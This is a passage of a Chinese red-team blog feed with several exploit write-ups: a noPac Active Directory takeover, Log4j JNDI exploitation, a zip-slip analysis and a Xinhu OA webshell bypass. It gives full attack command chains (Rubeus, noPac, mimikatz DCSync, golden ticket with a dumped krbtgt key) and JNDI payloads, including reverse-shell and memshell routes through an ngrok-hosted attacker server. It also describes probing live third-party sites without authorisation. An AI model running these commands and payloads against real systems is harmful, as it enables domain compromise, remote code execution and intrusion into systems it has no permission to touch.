DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        int modulecount;        Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);        Sleep(2000);        bool MeiJu = EnumProcessModules(pi.hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        modulecount = hmodulesizeneeded / sizeof(HMODULE);        printf(&quot;module count:%d\n&quot;, modulecount);        TerminateProcess(pi.hProcess, 0);        Sleep(2000);        for (int calc = 0;calc &lt; modulecount;calc++) {        //      printf(&quot;frequency:%d\n&quot;,calc);               si = { 0 };               pi = { 0 };               Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);               if (Ctprocess != true) {                       ErrorPrint(&quot;Rows:14 CreateProcessA&quot;, GetLastError());               }               int Ctprocesspid = pi.dwProcessId;               Sleep(2000);               int kt = PrintModules(pi.hProcess, Ctprocesspid);               if (kt == 1) {                       break;               }        }        /*        if (TerminateProcess(pi.hProcess,0) != true) {               ErrorPrint(&quot;Rows:53 TerminateProcess&quot;,GetLastError());        }        printf(&quot;Kill Process\n&quot;);        */        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7Yo5LQ.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;被几个吊毛同事催着更博客，立刻更了一篇 (&lt;/p&gt;
&lt;h2 id=&quot;利用NtMapViewOfSection来加载DLL&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278 域内翻身做主人</title>
    <link href="http://jiushill.github.io/posts/f591678b.html"/>
    <id>http://jiushill.github.io/posts/f591678b.html</id>
    <published>2021-12-14T17:11:47.000Z</published>
    <updated>2021-12-14T17:31:46.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理：<br>创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 再改回  sAMAccountName  ==  xxx 接着导入票据到本地<br>参考链接:<br><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" target="_blank" rel="noopener">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>yayi.local - windows server 2012(DC) HostName:WIN-5CHMN9C4UES<br>域内机器:win7<br>普通用户:jk Hxc123456</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>检测能否利用：<br>默认情况下，它是10，但可以更改，高于0 的任何内容都可以。</p><pre><code>Get-DomainObject | findstr ms-ds-machine</code></pre><p><img src="https://static.aichat.net/chat/202112/e5f12adc-6349-4cc0-a7f9-fb0cbc3b1fb6.png" alt=""></p><p>最后，我们需要检查默认情况下授予经过身份验证的用户的SeMachineAccountPrivilege</p><pre><code>邪法:whoami /user #取出来的ID第4位进行-10  SID:S-1-5-21-2799505025-1944254007-2887416074-500ConvertFrom-SID S-1-5-11</code></pre><p><img src="https://static.aichat.net/chat/202112/3868861c-2415-4341-a30b-a72dad829516.png" alt=""></p><p>手动利用:</p><ul><li>Powermad</li><li>Rubeus</li></ul><pre><code>#创建机器用户$password = ConvertTo-SecureString &#39;ComputerPassword&#39; -AsPlainText -ForceNew-MachineAccount -MachineAccount &quot;Eva&quot; -Password $($password) -Domain &quot;yayi.local&quot; -DomainController &quot;WIN-5CHMN9C4UES.YAYI.local&quot; -Verbose#清除SPN信息Set-DomainObject &quot;CN=Eva,CN=Computers,DC=yayi,DC=local&quot; -Clear &#39;serviceprincipalname&#39; -Verbose#重命名新建机器名为DC机器名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;WIN-5CHMN9C4UES&quot; -Attribute samaccountname -Verbose#获取TGTRubeus.exe asktgt /user:&quot;WIN-5CHMN9C4UES&quot; /password:&quot;ComputerPassword&quot; /domain:&quot;yayi.local&quot; /dc:&quot;WIN-5CHMN9C4UES.yayi.local&quot; /nowrap#改回原来的计算机名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;Eva&quot; -Attribute samaccountname -Verbose#Request S4U2self（获取票据）Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-5CHMN9C4UES.yayi.local /self /altservice:LDAP/WIN-5CHMN9C4UES.yayi.local /ptt /ticket:doIFJDCCBSCgAwIBBaEDAgEWooIEODCCBDRhggQwMIIELKADAgEFoQwbCllBWUkuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnlheWkubG9jYWyjggP0MIID8KADAgESoQMCAQKiggPiBIID3o63EAl/yUgDHQmpBMWzqmvewt4GpUMUik4+5+s6gv16FRxloS4LplB1VwDs3iqATa4M5+Toko9kp5jHX9M0vGRekAlWb9VS+N97mEySMMQxAGIFhwV2xI4UAiZxiNLa6W7jGW9M5/z5StTXTcH7WVNOgA3NIxbGO8UWu+Ezk6wbcLKaA/Cm5hh7T2B2i8BrZzbD9uTSGXnJZRRv+HTpiv9+mq8FFPjO99qiu3VvK0XJYW3lKFvKLUVFwQidsUzvI2xD1jbtG6WADp9kbYoi5Tbj6PsWTXoU/rtaaZmIMdAfQgXrTIZob99HdwoKGS0ICNqhy1TGLRIWOgofopOhHlf99wbtVVneVytACl18O0QXnLP+BPePaSfJTXBdcdcQVBgZM1M7z/bQFqlNyCTDS2NQwgak0iDSHv/c0tstbxCqqEA1EQ8X28N1ENx0zgvPA4rOUNaQlBpZv9SSPQEkb0Ca13yHo9INdkZ4637YzGXVYuAXT2/wH2BQ7AVOQvetwlsY7CNJ2p5FcgYEYAwkmqurF/1DTMKJsRkWhstBWqvSXbHRsk0bxrC6uR7qX45rFweg7Q9FLI4t7Iv+pMFJjDUxJXRETaXq7ASHFpWULtmMB2LqTPc+igqUstiZOIAHTYN3xuShCyd1Hq17ISHl3iQOLK1BUhdJVgveaG+RguTvgGQ9Z6IyzqbORrnO6aA9JINoqhvgxTmeBfP7JmY5Ll8xHRMxMsEz+fD66RGAg6HVW4cwAbQLZePxuOBo/oclpsh8HPLuLEi7EKCgerSu/ANkIo2jzk9+RPl4+wABXriaRzn7sl+MRTV0r30jCXe3hwyii9QWw4MSzsRpR7zF2oD2n9yDS7wMjAj8/4YUwySnqyaerVsfqreHEN3CgIf+Fp4ZL8Dm8w1bMQ4msfJUm6+s51E8W7FzOOLXA18SD6Qb9xZOFqor+JapyeqCfJj20ShCGlxBA73srP5AkNbI8OduTP52GcvVYmNLT1jJI7LLi0gE4tVjE336H1KHkSukvfK1r2r3E1thiafWjQO1CMn1g8o0HwN3jW6LwdRGuhz2m+ocoq5KE3TxdYxI1vjFqlCKns9FkMWXslw5SytOqYtEicBUPNa17J3d3QadF7l7VYJWtEw6xAeB9F29WTaRaJCL8s7ghh06K27FwxLheIUukdwgOsMpJttkiJtUI+0u97gzQlIkSd2jb8tGdDnpRITi2LTwg1vvpmSvaGMQdZ+Oash27JHktjQwMHArrMM1mjtI1cQUgOdaRZGXpbdh7ThTdJwopaJQYdNsCIJ9poJNOhLXw+IM8m9RyDdxeKOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEELSllXk3Qm2tX3lpkSuPLWShDBsKWUFZSS5MT0NBTKIcMBqgAwIBAaETMBEbD1dJTi01Q0hNTjlDNFVFU6MHAwUAQOEAAKURGA8yMDIxMTIxMjIwNDE0MVqmERgPMjAyMTEyMTMwNjQxNDFapxEYDzIwMjExMjE5MjA0MTQxWqgMGwpZQVlJLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwp5YXlpLmxvY2Fs#DCSync (DCSync krbtgt hash伪造黄金票据等选择)lsadump::dcsync /user:yayi\krbtgt</code></pre><p><img src="https://static.aichat.net/chat/202112/73d0b4c5-3853-413a-9afe-63796bfb270a.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/c9af7c4c-52ef-420c-9a0e-9a5df398433c.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/45b40aad-892e-408f-8390-a5f99aec132f.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/7c05acaa-c3a9-4655-896d-dd47e4d1b8de.png" alt=""></p><p>票据检查:<br><img src="https://static.aichat.net/chat/202112/7c696639-6049-4a03-8db5-23fae9abaa96.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e5385b26-cb22-439a-9bc3-7a5269071b64.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/84071697-f640-4aee-afbe-e4f4e5933f23.png" alt=""></p><p>nopac:<br><a href="https://github.com/cube0x0/noPac" target="_blank" rel="noopener">https://github.com/cube0x0/noPac</a></p><pre><code>noPac.exe -dc WIN-5CHMN9C4UES.YAYI.local -mAccount evilpc -mPassword 123.com /service ldap /pttMimikatz &quot;lsadump::dcsync /user:yayi\krbtgt&quot;92b27a8d7877a2e27cf095e9c136b3c390e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36mimikatz &quot;kerberos::golden /domain:yayi.local /sid:S-1-5-21-2799505025-1944254007-2887416074 /aes256:90e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36 /user:sb /ptt&quot; exit</code></pre><p><img src="https://static.aichat.net/chat/202112/c05157b5-da40-47ad-8a5c-334e837c708e.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/ec8e38af-49e8-4c8a-9197-e3e01fb14dfa.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/612200c3-1100-4c1a-8adf-940e01b3b555.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/2cfb451d-7577-4f8d-af68-4d7ed287873b.png" alt=""></p><p>impacket复现，没成功</p><pre><code>python3 addcomputer.py -computer-name fakename -computer-pass &#39;Passw0rd!&#39; -dc-ip 192.168.93.136 -dc-host WIN-5CHMN9C4UES.yayi.local yayi.local/jk:&#39;Hxc123456&#39;python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;fakename$&#39; -new-name WIN-5CHMN9C4UESpython3 getTGT.py yayi.local/WIN-5CHMN9C4UES:&#39;Passw0rd!&#39; -dc-ip 192.168.93.136python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;WIN-5CHMN9C4UES&#39; -new-name fakename$python3 getST.py -spn cifs/WIN-5CHMN9C4UES.yayi.local -impersonate admin -dc-ip 192.168.93.136 yayi.local/fakename$:passw0rd!python3 secretsdump.py -k -no-pass WIN-5CHMN9C4UES.yayi.local -just-dc</code></pre><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>解决此问题的最佳方法是安装 Microsoft 补丁 ( KB5008602 )，此补丁修复了 PAC 混淆的问题，并修复了由早期 KB5008380 补丁创建的 S4U2self 的此问题。<br>将机器帐户配额设置为0是阻止低权限用户创建机器帐户的快速而简单的解决方法，另一个相关的解决方法是从SeMachineAccountPrivilege 中删除Authenticated Users并添加域管理员或另一组允许的帐户。<br>由各种步骤引起的多个事件对于确定执行此攻击的尝试非常有用。确定这些事件的功劳完全归功于Andrew Schwartz，我只是在执行攻击后将我的日志发送给他。</p><p><img src="https://static.aichat.net/chat/202112/59927b79-aa84-4ff0-8b3f-47ea959f0acd.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;原理：&lt;br&gt;创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 </summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://jiushill.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>log4j漏洞复现</title>
    <link href="http://jiushill.github.io/posts/98d13101.html"/>
    <id>http://jiushill.github.io/posts/98d13101.html</id>
    <published>2021-12-14T16:38:49.000Z</published>
    <updated>2021-12-14T17:09:38.931Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞。</p><p>经分析，log4j2是全球使用广泛的java日志框架，同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p><p><strong>影响版本:Apache Log4j 2.x &lt;= 2.14.1</strong><br><img src="https://static.aichat.net/chat/202112/4a24af97-d778-4b04-a26c-6021a07e000e.png" alt=""></p><p>漏洞利用条件：</p><pre><code>core和api同时调用才可以利用成功，对于lombok这种方式却不行</code></pre><p>jdk版本限制<br><img src="https://static.aichat.net/chat/202112/7f779424-3bf0-4c58-9413-a14ea4ef06e8.png" alt=""></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>181和之前的利用  是ldap-&gt;发送重定向到class-&gt;远程加载class执行</p><p>限制:<br>限制了远程加载class,被限制的版本只能接受ldap的结果,不接受加载远程class</p><p>高版本的绕过：<br>绕过是ldap直接发送调用本地el库执行，不再发送重定向class，不加载远程类，ldap查询还是会发</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>POC</p><pre><code>${jndi:ldap://x.4j2a.dnslog.cn/exp} #有登录框就插，判断是否有回显 （有代表可能可以利用）</code></pre><p>当天晚上测试的 （亚马逊，网易云，京东，icound等等）<br><img src="https://static.aichat.net/chat/202112/ef86937d-6b9d-4300-b62f-2f4eafa80090.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e8b79e36-ebd7-4485-b4a2-c0ca4ac72fec.png" alt=""></p><p>本地测试环境:JDK_1.8.0_181和JDK_1.8.0_191 | 对应：8u181、8u191<br>Main.java</p><pre><code class="java">package com.company;import java.io.*;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Main {    public static final Logger logger = LogManager.getLogger(Main.class);    public static void main(String[] args) {        System.out.println(&quot;Start&quot;);        logger.error(&quot;${lower:${jndi:rmi://127.0.0.1:1099/wlzyww}}&quot;);    }}</code></pre><p>8u191 ldap可以请求出去，但是无法加载利用<br><img src="https://static.aichat.net/chat/202112/b0e3516e-2431-4652-9bac-693d0f37d3a5.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/462f6476-bb7b-4791-b9e0-777b681a8767.png" alt=""></p><p>调用栈跟踪：（大哥跟的）<br><img src="https://static.aichat.net/chat/202112/ac71e84a-232b-4af6-b228-f6a2e6af3397.png" alt=""></p><p>致远|用友A8利用log4j getshell<br>JNDIExploit-1.2-SNAPSHOT.jar:<a href="https://github.com/0x727/JNDIExploit" target="_blank" rel="noopener">https://github.com/0x727/JNDIExploit</a></p><pre><code>Supported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</code></pre><p>VPS/本地+ngrok<br><img src="https://static.aichat.net/chat/202112/3535500d-616d-4383-a347-de618310fe6e.png" alt=""></p><p>登录框插</p><pre><code>${jndi:ldap://4.tcp.ngrok.io:14296/Basic/TomcatMemshell2}</code></pre><p><img src="https://static.aichat.net/chat/202112/6deb3459-2646-40ed-a98a-3af3f92410c4.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/6d7d8566-f28f-4d38-879e-989199721561.png" alt=""></p><p>现存在问题:有些不行但是ldap能请求出来(一般是版本不行,不会bypass)</p><p>上线shellcode<br>将java执行shellcode编译为class，配合marshalsec即可<br><img src="https://static.aichat.net/chat/202112/63710e6a-a42e-494d-a297-b01aa2b25345.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a><br><a href="https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ</a><br><a href="https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某DCS zip Slip任意写文件漏洞</title>
    <link href="http://jiushill.github.io/posts/d1787975.html"/>
    <id>http://jiushill.github.io/posts/d1787975.html</id>
    <published>2021-12-05T00:53:20.000Z</published>
    <updated>2021-12-05T01:17:37.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hw的时候遇到的，结束后复现找了一下漏洞代码<br><img src="https://i.bmp.ovh/imgs/2021/12/1ec77b267b96fd4d.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞url:</p><pre><code>/dcs.web/upload?convertType=19&amp;isSourceDir=0</code></pre><p>文档说明<br><img src="https://s4.ax1x.com/2021/12/05/oBnmE8.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnu4g.png" alt=""></p><p>upload处理点<br><img src="https://s4.ax1x.com/2021/12/05/oBnQ3j.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn1vn.png" alt=""></p><p>config.inputDir.getPath()获取config.properties里的dir.input，然后设置了三个属性值:</p><pre><code>* fname - 文件名* finput - 文件上传后的路径* sourceRelativepath - 生成的UUID</code></pre><p><img src="https://s4.ax1x.com/2021/12/05/oBnw8J.png" alt=""></p><p>文件写入到input目录后，返回json请求/convert进行处理<br>首先调用buildParam函数进行处理<br><img src="https://s4.ax1x.com/2021/12/05/oBnyb6.png" alt=""></p><p>获取convertType参数，然后转换成int类型。传入EnumConvertType.getEnum判断值是否存在hash表里<br><img src="https://s4.ax1x.com/2021/12/05/oBncVK.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn25D.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnh2d.png" alt=""></p><p>经过获取一些请求参数后，然后来到 String lowrealInput = realInput.toLowerCase()<br><img src="https://s4.ax1x.com/2021/12/05/oBn4xA.png" alt=""></p><p>往上跟踪发现取finput属性，获取inputDir，outputDir，zipFileName，zipOutput请求参数。然后进行判断，由于请求都没有带到这些参数所以去到finput<br><img src="https://s4.ax1x.com/2021/12/05/oBnort.png" alt=""></p><p>然后进入大判断，判断lowrealInput尾部是否存在对应的后缀，并将EnumConvertType设置为对应的hash表key<br><img src="https://s4.ax1x.com/2021/12/05/oBnHVf.png" alt=""></p><p>然后去到284行，获取fname，fileName属性的值。判断fileName不为空调用setFIleName函数。设置this.fileName,然后获取compressedSuffix请求参数，最后判断enumType不为空调用updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnqIS.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnXGQ.png" alt=""></p><p>updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnj2j.png" alt=""></p><p>后面就是对一些请求参数转int进行设置<br><img src="https://s4.ax1x.com/2021/12/05/oBnvxs.png" alt=""></p><p>回到ConvertParamBuilder.class，经过checkParam函数判断是不是pdf，然后单独开个线程处理然后生成json调用getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuiIU.png" alt=""></p><p>getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuAG4.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBuVz9.png" alt=""></p><p>getResultDate函数生成返回的url<br><img src="https://s4.ax1x.com/2021/12/05/oBueMR.png" alt=""></p><p>ZipService.zipfile函数，先获取tmpDir目录然后调用copyDirectiory函数将input目录下上传的文件copy到out目录。最后调用zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuKZ6.png" alt=""></p><p>zip函数如下<br><img src="https://s4.ax1x.com/2021/12/05/oBuQIO.png" alt=""></p><p>zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBu3Je.png" alt=""></p><p>引用一张图<br><img src="https://s4.ax1x.com/2021/12/05/oBuYQA.png" alt=""></p><p>参考链接:<a href="https://saucer-man.com/information_security/364.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/364.html</a></p><p><img src="https://s4.ax1x.com/2021/12/05/oButsI.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBucyn.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;hw的时候遇到的，结束后复现找了一下漏洞代码&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/12/1ec</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
    <link href="http://jiushill.github.io/posts/3541f020.html"/>
    <id>http://jiushill.github.io/posts/3541f020.html</id>
    <published>2021-10-18T13:56:13.000Z</published>
    <updated>2021-10-18T14:09:23.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/286380.html&quot; target</summary>
      
    
    
    
    
